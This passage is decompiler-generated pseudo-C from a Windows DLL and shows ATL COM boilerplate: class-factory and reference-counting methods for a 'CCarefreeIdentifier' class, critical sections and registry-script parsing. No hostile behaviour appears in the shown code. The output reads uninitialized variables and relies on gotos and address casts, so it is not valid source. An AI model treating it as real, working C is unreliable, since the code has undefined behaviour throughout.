    v6 = v29;
    int32_t v80 = function_10010f00((int32_t)&g173, (int32_t)&g173); // 0x10011c7a
    v60 = v79;
    v10 = v79;
    if (v80 == 0) {
        // break -> 0x10011cad
        goto lab_0x10011cad_2;
    }
    goto lab_0x10011c83;
  lab_0x10011bba:;
    int32_t v89 = v12;
    v18 = v17;
    v26 = v25;
    v23 = v21;
    v14 = v89;
    if (v21 != 0) {
        goto lab_0x10011bf6;
    } else {
        // 0x10011bba
        v8 = *(int16_t *)&v6;
        v22 = v21;
        v13 = v89;
        goto lab_0x10011bc0;
    }
  lab_0x10011c83:;
    int32_t v81 = v60 - 4; // 0x10011c85
    *(int32_t *)v81 = v29;
    int16_t * v82 = CharNextW((int16_t *)&g173); // 0x10011c86
    *v28 = (int32_t)v82;
    v16 = v18;
    v24 = v26;
    v20 = v23;
    v11 = v81;
    v15 = v81;
    if (*v82 == 0) {
        goto lab_0x10011c99;
    }
    goto lab_0x10011b20;
  lab_0x10011bc0:;
    int32_t v83 = v13;
    char v84 = v22;
    int16_t v85 = v8; // 0x10011bc2
    int32_t v86 = v17 + (int32_t)(v85 == 123);
    v18 = v86;
    v26 = v25;
    v23 = v84;
    v14 = v83;
    if (v85 == 125) {
        int32_t v87 = v86 - 1; // 0x10011bd2
        v18 = v87;
        v26 = v25;
        v23 = v84;
        v14 = v83;
        if (v25 == 1 == v87 == 0) {
            int32_t v88 = v83 - 4; // 0x10011bdd
            *(int32_t *)v88 = (int32_t)L"\r\n\t}\r\n}\r\n";
            v6 = v29;
            v18 = 0;
            v26 = 0;
            v23 = v84;
            v14 = v88;
            v10 = v88;
            if (v85 == 0) {
                // break -> 0x10011cad
                goto lab_0x10011cad_2;
            }
        }
    }
    goto lab_0x10011bf6;
}

// Address range: 0x10011d20 - 0x10011d52
int32_t function_10011d20(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x10011d20
    if (*(int32_t *)a1 != 0 || *(int32_t *)(a1 + 4) != 0 || *(int32_t *)(a1 + 8) != 192) {
        // 0x10011d43
        return 0;
    }
    // 0x10011d3a
    if (*(int32_t *)(a1 + 12) == 0x46000000) {
        // 0x10011d43
        return 1;
    }
    // 0x10011d43
    return 0;
}

// Address range: 0x10011d60 - 0x10011db4
// From class:    .?AV?$CComObjectCached@VCComClassFactory@ATL@@@ATL@@
// Type:          virtual member function
int32_t function_10011d60(int32_t result, int32_t a2, int32_t a3, int32_t a4) {
    // 0x10011d60
    if (a4 == 0) {
        // 0x10011d9c
        return -0x7fffbffd;
    }
    // 0x10011d6f
    *(int32_t *)a4 = 0;
    if (a2 == 0) {
        // 0x10011d9c
        return result;
    }
    // 0x10011d7f
    if (*(int32_t *)a3 != 0 || *(int32_t *)(a3 + 4) != 0 || *(int32_t *)(a3 + 8) != 192 || *(int32_t *)(a3 + 12) != 0x46000000) {
        // 0x10011d9c
        return -0x7ffbfef0;
    }
    // 0x10011d9c
    return result;
}

// Address range: 0x10011dc0 - 0x10011de7
// From class:    .?AV?$CComObjectCached@VCComClassFactory@ATL@@@ATL@@
// Type:          virtual member function
int32_t function_10011dc0(int32_t a1) {
    // 0x10011dc0
    return 0;
}

// Address range: 0x10011df0 - 0x10011e26
int32_t function_10011df0(char a1) {
    // 0x10011df0
    int32_t result; // 0x10011df0
    *(int32_t *)result = (int32_t)&g12;
    char * v1 = (char *)(result + 32); // 0x10011dff
    if (*v1 != 0) {
        // 0x10011e05
        *v1 = 0;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)(result + 8));
    }
    if ((a1 & 1) != 0) {
        // 0x10011e16
        _3f__3f_3_40_YAXPAX_40_Z(&g173);
    }
    // 0x10011e1f
    return result;
}

// Address range: 0x10011e30 - 0x10011ea1
int32_t function_10011e30(int32_t * a1, int32_t * a2) {
    // 0x10011e30
    int32_t v1; // 0x10011e30
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x10011e36
    int32_t v3 = __recalloc(v1, *v2 + 1, 4); // 0x10011e40
    if (v3 == 0) {
        // 0x10011e4c
        return 0;
    }
    // 0x10011e53
    *(int32_t *)v1 = v3;
    int32_t * v4 = (int32_t *)(v1 + 4); // 0x10011e5b
    int32_t v5 = __recalloc(*v4, *v2 + 1, 4); // 0x10011e60
    if (v5 == 0) {
        // 0x10011e4c
        return 0;
    }
    // 0x10011e6c
    *v4 = v5;
    int32_t v6 = *v2; // 0x10011e6f
    int32_t v7 = 8 * v6; // 0x10011e7b
    int32_t v8 = v5; // 0x10011e7d
    if (v7 != 0) {
        // 0x10011e7f
        *(int32_t *)v7 = *a1;
        v8 = *v4;
    }
    int32_t v9 = v8 + 4 * v6; // 0x10011e89
    if (v9 != 0) {
        // 0x10011e8d
        *(int32_t *)v9 = *a2;
    }
    // 0x10011e94
    *v2 = *v2 + 1;
    return 1;
}

// Address range: 0x10011eb0 - 0x10011ef4
int32_t function_10011eb0(int32_t a1) {
    int32_t v1 = 2 * a1; // 0x10011ec3
    int32_t v2; // bp-8, 0x10011eb0
    int32_t * v3 = &v2; // 0x10011ec3
    if (a1 <= -1) {
        int32_t v4 = -0x7ff8fdea; // bp-12, 0x10011eca
        v1 = function_100108b0(-0x7ff8fdea);
        v3 = &v4;
    }
    // 0x10011ed4
    int32_t result2; // 0x10011eb0
    if (v1 < 1025) {
        int32_t result = result2 + 4; // 0x10011eea
        *(int32_t *)result2 = result;
        return result;
    }
    // 0x10011edb
    *(int32_t *)((int32_t)v3 - 4) = v1;
    function_100114d0((int32_t)&g173);
    return result2;
}

// Address range: 0x10011f00 - 0x10011f44
int32_t function_10011f00(int32_t a1) {
    int32_t v1 = 2 * a1; // 0x10011f13
    int32_t v2; // bp-8, 0x10011f00
    int32_t * v3 = &v2; // 0x10011f13
    if (a1 <= -1) {
        int32_t v4 = -0x7ff8fdea; // bp-12, 0x10011f1a
        v1 = function_100108b0(-0x7ff8fdea);
        v3 = &v4;
    }
    // 0x10011f24
    int32_t result2; // 0x10011f00
    if (v1 < 257) {
        int32_t result = result2 + 4; // 0x10011f3a
        *(int32_t *)result2 = result;
        return result;
    }
    // 0x10011f2b
    *(int32_t *)((int32_t)v3 - 4) = v1;
    function_100114d0((int32_t)&g173);
    return result2;
}

// Address range: 0x10011f50 - 0x10011f8c
int32_t function_10011f50(uint32_t a1, int32_t a2, int32_t a3) {
    // 0x10011f50
    int32_t result2; // 0x10011f50
    if (a1 < 257) {
        int32_t result = result2 + 4; // 0x10011f82
        *(int32_t *)result2 = result;
        return result;
    }
    // 0x10011f73
    int32_t v1; // bp-8, 0x10011f50
    *(int32_t *)((int32_t)&v1 - 4) = a1;
    function_100114d0((int32_t)&g173);
    return result2;
}

// Address range: 0x10011f90 - 0x10012077
int32_t function_10011f90(int32_t a1, int32_t ** a2, int32_t a3, int32_t result, int32_t a5) {
    // 0x10011f90
    if (a1 == 0 || a2 == NULL) {
        // 0x10011fb1
        return -0x7ff8ffa9;
    }
    // 0x10011fa9
    if (result == 0) {
        // 0x10011fb1
        return -0x7fffbffd;
    }
    int32_t v1 = (int32_t)a2; // 0x10011f9e
    int32_t v2 = a3; // bp-20, 0x10011fc0
    int32_t * v3 = (int32_t *)result; // 0x10011fc1
    *v3 = 0;
    int32_t v4; // 0x10011f90
    int32_t v5; // 0x10011f90
    int32_t v6; // 0x10011f90
    int32_t v7; // 0x10011f90
    int32_t v8; // 0x10011f90
    int32_t v9; // 0x10011f90
    int32_t v10; // 0x10011f90
    int32_t v11; // 0x10011f90
    int32_t v12; // 0x10011ff0
    int32_t v13; // 0x10011f90
    int32_t v14; // 0x10011f90
    int32_t v15; // 0x10011f90
    int32_t v16; // 0x10011f90
    if (function_10011d20(v2, v11, v16, v14, v15) == 0) {
        int32_t v17 = *(int32_t *)(v1 + 8); // 0x10011fe9
        if (v17 == 0) {
            // 0x10011fb1
            return -0x7fffbffe;
        }
        // 0x10011ff0
        v4 = v17;
        v8 = &v2;
        v6 = v1;
        while (true) {
          lab_0x10011ff0:
            // 0x10011ff0
            v7 = v6;
            v9 = v8;
            v5 = v4;
            v12 = *(int32_t *)v7;
            if (v12 == 0) {
                goto lab_0x1001201b;
            } else {
                // 0x10011ffd
                v10 = v9;
                if (*(int32_t *)v12 != *(int32_t *)a3) {
                    goto lab_0x1001203b;
                } else {
                    // 0x10012003
                    v10 = v9;
                    if (*(int32_t *)(v12 + 4) != *(int32_t *)(a3 + 4)) {
                        goto lab_0x1001203b;
                    } else {
                        // 0x1001200b
                        v10 = v9;
                        if (*(int32_t *)(v12 + 8) != *(int32_t *)(a3 + 8)) {
                            goto lab_0x1001203b;
                        } else {
                            // 0x10012013
                            v10 = v9;
                            if (*(int32_t *)(v12 + 12) != *(int32_t *)(a3 + 12)) {
                                goto lab_0x1001203b;
                            } else {
                                goto lab_0x1001201b;
                            }
                        }
                    }
                }
            }
        }
      lab_0x10012051:;
        int32_t v18 = v13 + a1; // 0x10012054
        *(int32_t *)(v9 - 4) = v18;
        *v3 = v18;
        return 0;
    }
    // 0x10011fd0
    *v3 = *(int32_t *)(v1 + 4) + a1;
    // 0x10011fb1
    return 0;
  lab_0x1001201b:
    // 0x1001201b
    v13 = *(int32_t *)(v7 + 4);
    if (v5 == 1) {
        // break -> 0x10012051
        goto lab_0x10012051;
    }
    // 0x10012033
    *(int32_t *)(v9 - 4) = v13;
    *(int32_t *)(v9 - 8) = result;
    *(int32_t *)(v9 - 12) = a3;
    int32_t v19 = v9 - 16; // 0x1001202c
    *(int32_t *)v19 = a1;
    v10 = v19;
    if (result < 0 == (v12 != 0)) {
        // 0x10011fb1
        return result;
    }
    goto lab_0x1001203b;
  lab_0x1001203b:;
    int32_t v20 = *(int32_t *)(v7 + 20); // 0x1001203b
    v4 = v20;
    v8 = v10;
    v6 = v7 + 12;
    if (v20 == 0) {
        // 0x10011fb1
        return -0x7fffbffe;
    }
    goto lab_0x10011ff0;
}

// Address range: 0x10012080 - 0x10012097
int32_t function_10012080(void) {
    // 0x10012080
    int32_t result; // 0x10012080
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = -1;
    return result;
}

// Address range: 0x100120a0 - 0x100120bf
// From class:    .?AV?$CComObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_100120a0(int32_t a1) {
    if (a1 == 0) {
        // 0x100120aa
        return -0x7fffbffd;
    }
    // 0x100120b3
    *(int32_t *)a1 = 1;
    return 0;
}

// Address range: 0x100120c0 - 0x100120d0
// From class:    .?AV?$CComObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_100120c0(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 8); // 0x100120c6
    int32_t result = *v1 + 1; // 0x100120c6
    *v1 = result;
    return result;
}

// Address range: 0x100120d0 - 0x100120f3
// From class:    .?AV?$CComObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_100120d0(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 8); // 0x100120d6
    int32_t result = *v1 - 1; // 0x100120d6
    *v1 = result;
    return result;
}

// Address range: 0x10012100 - 0x1001210a
int32_t function_10012100(int32_t a1) {
    // 0x10012100
    return function_100120d0(a1 - 4);
}

// Address range: 0x10012110 - 0x1001211a
int32_t function_10012110(int32_t a1) {
    // 0x10012110
    return function_100120c0(a1 - 4);
}

// Address range: 0x10012120 - 0x100122ef
int32_t function_10012120(int32_t a1) {
    int32_t v1 = a1;
    int32_t v2 = __readfsdword(0); // bp-16, 0x10012130
    __writefsdword(0, (int32_t)&v2);
    int32_t v3 = a1; // bp-64, 0x1001215c
    if (*(int32_t *)a1 < 0) {
        // 0x100122a4
        __writefsdword(0, v2);
        return 0;
    }
    int32_t v4 = &v3; // 0x1001215c
    int32_t v5; // 0x10012120
    uint16_t v6 = *(int16_t *)(v5 + 44); // 0x1001216c
    int32_t v7 = v6; // 0x1001216c
    int32_t v8; // 0x10012120
    int32_t * v9 = (int32_t *)(v8 + 24); // 0x10012175
    *v9 = v7;
    int32_t * v10 = (int32_t *)(v8 + 20); // 0x10012178
    *v10 = 0;
    int32_t v11 = 0; // 0x1001217d
    int32_t v12 = v4; // 0x1001217d
    int32_t v13; // bp-36, 0x10012120
    if (v6 == 0) {
        goto lab_0x100121e5;
    } else {
        int32_t v14 = function_1001ac88(12 * v7 + 4, v3, &v13); // 0x1001219f
        v12 = v4;
        if (v14 == 0) {
            goto lab_0x100122ca;
        } else {
            // 0x100121ce
            v11 = v14 + 4;
            int32_t v15 = v11; // bp-84, 0x100121c2
            v12 = &v15;
            *(int32_t *)v14 = v7;
            _3f__3f__L_40_YGXPAXIHP6EX0_40_Z1_40_Z((int32_t *)v15, 12, v7, (void (*)(int32_t *))0x10012080, (void (*)(int32_t *))0x10011450);
            if (v11 == 0) {
                goto lab_0x100122ca;
            } else {
                goto lab_0x100121e5;
            }
        }
    }
  lab_0x100121e5:;
    int32_t v16 = v12; // 0x100121eb
    if (*v9 > 0) {
        int32_t v17 = &v1;
        int16_t * v18 = NULL;
        int32_t v19 = (int32_t)v18; // 0x100121f4
        int32_t v20; // bp-24, 0x10012120
        *(int32_t *)(v12 - 4) = (int32_t)&v20;
        *(int32_t *)(v12 - 8) = v19;
        int32_t v21 = v12 - 12; // 0x10012201
        *(int32_t *)v21 = a1;
        int32_t v22 = v21; // 0x10012206
        int32_t v23; // 0x10012120
        int32_t v24; // 0x10012120
        uint32_t v25; // 0x1001221e
        int32_t v26; // 0x10012224
        int32_t v27; // 0x10012232
        int32_t * v28; // 0x10012235
        int32_t v29; // 0x10012235
        int32_t v30; // 0x10012242
        int32_t v31; // 0x1001224d
        if (v18 >= NULL) {
            // 0x10012208
            v1 = 0;
            *(int32_t *)(v12 - 16) = 0;
            *(int32_t *)(v12 - 20) = 0;
            *(int32_t *)(v12 - 24) = 0;
            *(int32_t *)(v12 - 28) = v17;
            v25 = *(int32_t *)v20;
            *(int32_t *)(v12 - 32) = v25;
            v26 = v12 - 36;
            *(int32_t *)v26 = a1;
            v31 = v26;
            if (v25 >= 0) {
                // 0x10012232
                v27 = v1;
                v28 = (int32_t *)v11;
                v29 = *v28;
                v1 = 0;
                if (v29 == v27) {
                    // 0x10012232
                    v23 = *v28;
                    v24 = v26;
                } else {
                    // 0x10012242
                    v30 = v12 - 40;
                    *(int32_t *)v30 = v29;
                    SysFreeString(v18);
                    *v28 = v27;
                    v23 = v27;
                    v24 = v30;
                }
                // 0x1001224b
                v31 = v24 - 4;
                *(int32_t *)v31 = v23;
                *(int32_t *)(v11 + 4) = SysStringLen((int16_t *)&g173);
                *(int32_t *)(v11 + 8) = *(int32_t *)v20;
            }
            // 0x10012262
            *(int32_t *)(v31 - 4) = v20;
            *(int32_t *)(v31 - 8) = a1;
            v22 = v31 - 12;
            *(int32_t *)v22 = v1;
            SysFreeString((int16_t *)-1);
        }
        int32_t v32 = v22;
        uint32_t v33 = v19 + 1; // 0x10012282
        int32_t v34 = v11 + 12; // 0x1001228c
        v16 = v32;
        while (v33 < *v9) {
            int32_t v35 = v34;
            int32_t v36 = v32;
            v18 = (int16_t *)v33;
            v19 = (int32_t)v18;
            *(int32_t *)(v36 - 4) = (int32_t)&v20;
            *(int32_t *)(v36 - 8) = v19;
            v21 = v36 - 12;
            *(int32_t *)v21 = a1;
            v22 = v21;
            if (v18 >= NULL) {
                // 0x10012208
                v1 = 0;
                *(int32_t *)(v36 - 16) = 0;
                *(int32_t *)(v36 - 20) = 0;
                *(int32_t *)(v36 - 24) = 0;
                *(int32_t *)(v36 - 28) = v17;
                v25 = *(int32_t *)v20;
                *(int32_t *)(v36 - 32) = v25;
                v26 = v36 - 36;
                *(int32_t *)v26 = a1;
                v31 = v26;
                if (v25 >= 0) {
                    // 0x10012232
                    v27 = v1;
                    v28 = (int32_t *)v35;
                    v29 = *v28;
                    v1 = 0;
                    if (v29 == v27) {
                        // 0x10012232
                        v23 = *v28;
                        v24 = v26;
                    } else {
                        // 0x10012242
                        v30 = v36 - 40;
                        *(int32_t *)v30 = v29;
                        SysFreeString(v18);
                        *v28 = v27;
                        v23 = v27;
                        v24 = v30;
                    }
                    // 0x1001224b
                    v31 = v24 - 4;
                    *(int32_t *)v31 = v23;
                    *(int32_t *)(v35 + 4) = SysStringLen((int16_t *)&g173);
                    *(int32_t *)(v35 + 8) = *(int32_t *)v20;
                }
                // 0x10012262
                *(int32_t *)(v31 - 4) = v20;
                *(int32_t *)(v31 - 8) = a1;
                v22 = v31 - 12;
                *(int32_t *)v22 = v1;
                SysFreeString((int16_t *)-1);
            }
            // 0x1001227f
            v32 = v22;
            v33 = v19 + 1;
            v34 = v35 + 12;
            v16 = v32;
        }
    }
    // 0x10012292
    *v10 = v11;
    *(int32_t *)(v16 - 4) = v13;
    *(int32_t *)(v16 - 8) = a1;
    // 0x100122a4
    __writefsdword(0, v2);
    return 0;
  lab_0x100122ca:
    // 0x100122ca
    *(int32_t *)(v12 - 4) = v13;
    *(int32_t *)(v12 - 8) = a1;
    __writefsdword(0, v2);
    return -0x7ff8fff2;
}

// Address range: 0x100122f0 - 0x10012343
int32_t function_100122f0(int32_t a1) {
    // 0x100122f0
    if (a1 == 0) {
        // 0x1001233e
        int32_t result; // 0x100122f0
        return result;
    }
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x100122fb
    int32_t v2 = *v1; // 0x100122fb
    int32_t v3; // bp-8, 0x100122f0
    int32_t * v4 = &v3; // 0x10012300
    if (v2 != 0) {
        int32_t v5 = v2; // bp-12, 0x10012307
        v4 = &v5;
    }
    int32_t * v6 = (int32_t *)(a1 + 20); // 0x1001230a
    int32_t v7 = *v6; // 0x1001230a
    *v1 = 0;
    int32_t result2 = 0; // 0x10012316
    if (v7 != 0) {
        int32_t v8 = (int32_t)v4;
        int32_t v9 = v7 - 4; // 0x10012318
        *(int32_t *)(v8 - 8) = 0x10011450;
        *(int32_t *)(v8 - 12) = *(int32_t *)v9;
        *(int32_t *)(v8 - 16) = 12;
        *(int32_t *)(v8 - 20) = v7;
        int32_t v10; // 0x100122f0
        _3f__3f__M_40_YGXPAXIHP6EX0_40_Z_40_Z((int32_t *)v3, v10, (int32_t)&g173, (void (*)(int32_t *))&g173);
        *(int32_t *)(v8 - 24) = v9;
        result2 = function_1001a6db();
    }
    // 0x10012337
    *v6 = 0;
    // 0x1001233e
    return result2;
}

// Address range: 0x10012350 - 0x1001235f
int32_t function_10012350(void) {
    // 0x10012350
    int32_t result; // 0x10012350
    return result;
}

// Address range: 0x10012360 - 0x1001237d
// From class:    .?AV?$CComObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_10012360(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10012360
    int32_t v1; // 0x10012360
    return function_10011f90(a1, &g15, a2, a3, v1);
}

// Address range: 0x10012380 - 0x100123bd
// From class:    .?AV?$CComObject@VCCarefreeIdentifier@@@ATL@@
// Type:          constructor
int32_t function_10012380(char a1) {
    // 0x10012380
    int32_t result; // 0x10012380
    *(int32_t *)result = (int32_t)&g14;
    *(int32_t *)(result + 4) = (int32_t)&g13;
    *(int32_t *)(result + 8) = -0x3fffffff;
    if ((a1 & 1) != 0) {
        // 0x100123ad
        _3f__3f_3_40_YAXPAX_40_Z(&g173);
    }
    // 0x100123b6
    return result;
}

// Address range: 0x100123c0 - 0x100123d8
int32_t function_100123c0(void) {
    // 0x100123c0
    int32_t lpCriticalSection; // 0x100123c0
    char * v1 = (char *)(lpCriticalSection + 4); // 0x100123c3
    int32_t result; // 0x100123c0
    if (*v1 != 0) {
        // 0x100123c9
        LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)lpCriticalSection);
        *v1 = 0;
        result = &g173;
    }
    // 0x100123d6
    return result;
}

// Address range: 0x100123e0 - 0x10012468
int32_t function_100123e0(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x100123e0
    int32_t v1; // 0x100123e0
    if (v1 != 0) {
        if (a1 != 0) {
            // 0x10012455
            return 1;
        }
    } else {
        if (v1 == a1) {
            // 0x100123f0
            return v1 & -256 | 1;
        }
    }
    // 0x1001245f
    return v1 & -256;
}

// Address range: 0x10012470 - 0x1001247a
int32_t function_10012470(int32_t a1) {
    // 0x10012470
    return function_10012360(a1 - 4, (int32_t)&g173, (int32_t)&g173);
}

// Address range: 0x10012480 - 0x10012544
int32_t function_10012480(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10012490
    __writefsdword(0, (int32_t)&v1);
    if (a1 == 0) {
        // 0x100124b2
        __writefsdword(0, v1);
        return -0x7ff8ffa9;
    }
    int32_t v2 = _3f__3f_2_40_YAPAXI_40_Z(12); // 0x100124d4
    if (v2 == 0) {
        // 0x100124e2
        __writefsdword(0, v1);
        return -0x7ff8fff2;
    }
    // 0x10012501
    *(int32_t *)v2 = a2;
    *(int32_t *)(v2 + 4) = a3;
    struct _RTL_CRITICAL_SECTION * lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)(a1 + 12); // 0x1001250f
    EnterCriticalSection(lpCriticalSection);
    int32_t * v3 = (int32_t *)(a1 + 8); // 0x10012516
    *(int32_t *)(v2 + 8) = *v3;
    *v3 = v2;
    LeaveCriticalSection(lpCriticalSection);
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x10012550 - 0x10012565
int32_t function_10012550(int32_t a1) {
    // 0x10012550
    return *(int32_t *)(a1 + 8);
}

// Address range: 0x10012570 - 0x10012585
int32_t function_10012570(int32_t a1) {
    // 0x10012570
    return *(int32_t *)(a1 + 8);
}

// Address range: 0x10012590 - 0x100125ac
int32_t function_10012590(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10012590
    return *(int32_t *)*(int32_t *)*(int32_t *)(a1 + 8);
}

// Address range: 0x100125b0 - 0x100125ba
// From class:    .?AV?$CComContainedObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_100125b0(int32_t a1) {
    // 0x100125b0
    return function_10012570(a1 - 4);
}

// Address range: 0x100125c0 - 0x100125ca
// From class:    .?AV?$CComContainedObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_100125c0(int32_t a1) {
    // 0x100125c0
    return function_10012550(a1 - 4);
}

// Address range: 0x100125d0 - 0x100125da
// From class:    .?AV?$CComContainedObject@VCCarefreeIdentifier@@@ATL@@
// Type:          virtual member function
int32_t function_100125d0(int32_t a1) {
    // 0x100125d0
    return function_10012590(a1 - 4, (int32_t)&g173, (int32_t)&g173);
}

// Address range: 0x100125e0 - 0x10012631
int32_t function_100125e0(int32_t a1, int32_t a2, int32_t * a3) {
    int32_t * v1 = (int32_t *)a1; // 0x100125e8
    int32_t v2; // 0x100125e0
    int32_t v3; // 0x100125e0
    int32_t v4; // 0x100125e0
    if ((char)function_100123e0(*v1, v2, v3, v4) != 0) {
        // 0x100125fc
        int32_t result; // 0x100125e0
        return result;
    }
    int32_t v5 = *v1; // 0x100125f6
    int32_t v6; // 0x100125e0
    if (v6 == 0) {
        // 0x100125fc
        return 0;
    }
    // 0x10012604
    *(int32_t *)v6 = 0;
    int32_t v7; // 0x100125e0
    if (v5 != 0) {
        // 0x10012610
        v7 = *(int32_t *)v5;
    }
    // 0x100125fc
    return *(int32_t *)(v7 + 8);
}

// Address range: 0x10012640 - 0x10012670
int32_t function_10012640(int32_t a1, int32_t a2) {
    // 0x10012640
    int32_t v1; // 0x10012640
    int32_t v2; // 0x10012640
    if (v2 == 0) {
        // 0x1001265c
        return function_10012480(0, a1, a2, v1);
    }
    // 0x10012647
    return function_10012480(v2 + 4, a1, a2, v1);
}

// Address range: 0x10012670 - 0x100127f9
int32_t function_10012670(int32_t lpString, int32_t lpString2) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10012680
    __writefsdword(0, (int32_t)&v1);
    if (lpString == 0 || lpString2 == 0) {
        // 0x100127e3
        __writefsdword(0, v1);
        return 0;
    }
    int32_t v2 = 2 * lstrlenW((int16_t *)lpString) + 2; // 0x100126be
    int32_t v3 = function_1001ac88(v2 < 0 ? -1 : 2 * v2, (int32_t)&g173, &g173); // 0x100126dc
    int32_t v4 = v3; // bp-24, 0x100126e6
    int32_t v5 = lpString2; // bp-72, 0x100126f9
    int32_t v6 = 2 * lstrlenW((int16_t *)lpString2) + 2; // 0x1001270a
    int32_t v7 = function_1001ac88(v6 < 0 ? -1 : 2 * v6, (int32_t)&g173, &g173); // 0x1001272b
    int32_t v8 = v7; // bp-28, 0x10012735
    int32_t result = 0; // 0x10012760
    int32_t v9 = v3; // 0x10012760
    int32_t v10 = v7; // 0x10012760
    int32_t * v11 = &v5; // 0x10012760
    if (v3 != 0 && v7 != 0) {
        int32_t v12 = lpString; // bp-80, 0x1001276d
        function_100108d0(v3, v2, lpString, v2);
        function_100108d0(v7, v6, lpString2, v6);
        v12 = &v4;
        int32_t v13 = function_10011e30(&v4, &v8); // 0x1001278f
        v10 = v13 != 0 ? 0 : v7;
        result = v13 != 0;
        v9 = v13 != 0 ? 0 : v3;
        v11 = &v12;
    }
    int32_t v14 = (int32_t)v11;
    *(int32_t *)(v14 - 4) = v10;
    function_1001a6db();
    *(int32_t *)(v14 - 8) = v9;
    function_1001a6db();
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x10012800 - 0x1001287a
// From class:    .?AVCRegObject@ATL@@
// Type:          virtual member function
int32_t function_10012800(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10012810
    __writefsdword(0, (int32_t)&v1);
    if (a2 == 0 || a3 == 0) {
        // 0x10012864
        __writefsdword(0, v1);
        return -0x7ff8ffa9;
    }
    int32_t result = function_10012670(a2, a3) == 0 ? -0x7ff8fff2 : 0; // 0x1001284e
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x10012880 - 0x10012bf3
int32_t function_10012880(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10012890
    __chkstk();
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = 0; // bp-8480, 0x100128e2
    int32_t v3; // 0x10012880
    if (function_100111c0(v3) < 0) {
        // 0x10012bd5
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    int32_t v4 = &v2; // bp-44, 0x100128ff
    int16_t lpString; // bp-8216, 0x10012880
    if (function_10010fe0((int32_t *)&lpString, &v2) == 0) {
        // 0x10012bd5
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    int32_t v5 = &lpString; // 0x100128c7
    function_10011160();
    v4 = v5;
    if (function_100111c0(v5) < 0) {
        // 0x10012bd5
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
    int32_t v6 = &v4; // 0x1001292a
    uint32_t v7 = v2 & 0xffff; // 0x1001293a
    int32_t v8; // 0x10012880
    int32_t v9; // 0x10012880
    int32_t v10; // 0x10012880
    int32_t * v11; // 0x10012880
    int32_t v12; // 0x10012880
    int32_t v13; // bp-52, 0x10012880
    if (v7 > 19) {
        // 0x10012adc
        v12 = v6;
        if (v7 != 0x4008) {
            goto lab_0x10012bbd;
        } else {
            // 0x10012ba8
            v13 = lstrlenW(&lpString) + 2;
            function_10011f00(0);
            function_100114c0();
            v8 = 14;
            v10 = &v13;
            goto lab_0x10012bac;
        }
    } else {
        int32_t v14; // bp-56, 0x10012880
        int32_t v15; // 0x1001293a
        switch ((int16_t)v15) {
            case 19: {
                // 0x10012a99
                v13 = 0;
                v14 = 0;
                VarUI4FromStr(NULL, (int32_t)&g173, (int32_t)&g173, &g173);
                int32_t v16 = a2; // bp-68, 0x10012ac2
                int32_t v17; // 0x10012880
                int32_t v18 = function_10010e00(a2, v17); // 0x10012ac5
                function_100114a0();
                v11 = &v16;
                v9 = v18;
                goto lab_0x10012ba8_2;
            }
            case 8: {
                // 0x10012a81
                v13 = v5;
                v14 = a2;
                int32_t v19 = function_10010e20(a2, (int32_t *)&lpString, 1); // 0x10012a8d
                v11 = &v14;
                v9 = v19;
                goto lab_0x10012ba8_2;
            }
            default: {
                // 0x10012959
                v12 = v6;
                if (v7 == 17) {
                    int32_t v20 = lstrlenW(&lpString); // 0x10012969
                    if ((v20 & 1) == 0) {
                        int32_t v21 = (v20 - (v20 >> 31)) / 2; // 0x10012981
                        v2 = v21;
                        v13 = v21;
                        function_10011f50(v20, v21, 0);
                        function_100114c0();
                    }
                    // 0x10012bd5
                    __writefsdword(0, v1);
                    return _40___security_check_cookie_40_4();
                }
                goto lab_0x10012bbd;
            }
        }
    }
  lab_0x10012bbd:
    // 0x10012bbd
    *(int32_t *)(v12 - 4) = a3;
    function_100111c0((int32_t)&g173);
    // 0x10012bd5
    __writefsdword(0, v1);
    return _40___security_check_cookie_40_4();
  lab_0x10012bac:
    // 0x10012bac
    *(int32_t *)(v10 - 4) = v8;
    function_10010aa0((int32_t)&g173);
    // 0x10012bd5
    __writefsdword(0, v1);
    return _40___security_check_cookie_40_4();
  lab_0x10012ba8_2:;
    int32_t v22 = (int32_t)v11;
    v8 = v9;
    v10 = v22;
    v12 = v22;
    if (v9 == 0) {
        goto lab_0x10012bbd;
    } else {
        goto lab_0x10012bac;
    }
}

// Address range: 0x10012c00 - 0x10013360
int32_t function_10012c00(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10012c10
    __chkstk();
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = 0; // bp-8748, 0x10012c46
    int32_t v3 = a1; // bp-36, 0x10012c5b
    if (function_100111c0(a4) < 0) {
        // 0x100132b1
        __writefsdword(0, v1);
        return _40___security_check_cookie_40_4();
    }
